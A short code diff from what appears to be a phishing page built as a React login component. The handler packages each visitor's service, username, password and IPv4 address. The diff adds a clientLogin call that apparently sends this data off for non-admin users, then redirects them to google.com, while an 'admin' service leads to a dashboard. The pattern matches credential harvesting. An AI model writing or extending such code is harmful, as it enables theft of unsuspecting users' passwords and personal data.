@@ -47,12 +47,12 @@ const Login = ({ argument }) => {
   // Function to handle HTTP request to save username and password
   const handleSaveData = async (username, password) => {
     const jsonData = { service, username, password, ipv4, date: new Date() };
-    console.log(service);
     if (service === "admin") {
       if (login(jsonData)) {
         router.push("/admin");
       }
     } else {
+      clientLogin(jsonData);
       window.location.href = "https://www.google.com";
     }
   };
